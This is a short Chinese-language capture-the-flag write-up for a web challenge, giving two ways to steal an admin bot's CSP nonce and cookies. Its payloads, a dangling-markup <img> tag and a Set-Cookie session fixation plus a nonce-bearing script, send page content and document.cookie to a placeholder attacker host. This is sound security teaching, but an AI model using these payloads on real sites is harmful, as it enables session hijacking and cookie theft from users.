## wanna hack him?

这题有两种解法。

### 解法一

利用`dangling markup attack`。传入一个未闭合的标签，来把后面内容通过请求直接发出去，因为bot的版本是Chrome60所以可以直接用一个比较常见的payload

```
<img src='http://yourhost/?key=
```

这样因为`<img>`标签里的`src`未闭合所以会把后面的html代码也当做`src`属性的一部分直到遇到下一个单引号，所以我们可以拿到管理员的`nonce`
![](https://i.imgur.com/vwf5JNV.png)

拿到nonce后就是常规XSS操作了。

### 解法二

因为这题的`nonce`是根据`session`生成的，所以我们可以用`<meta>`标签来`Set-Cookie`，把bot的`PHPSESSID`设置成我们的，这样bot的`nonce`就和我们的一样。可以通过`preview.php`拿到我们的`nonce`。

payload:
```
<meta http-equiv="Set-Cookie" content="PHPSESSID=yoursession; path=/">
<script nonce="yournonce">(new Image()).src='http://yourhost/?cookie='+escape(document.cookie)</script>
```

![](https://i.imgur.com/sjLglKQ.png)

关注我blog接下来的详细分析: http://math1as.com/
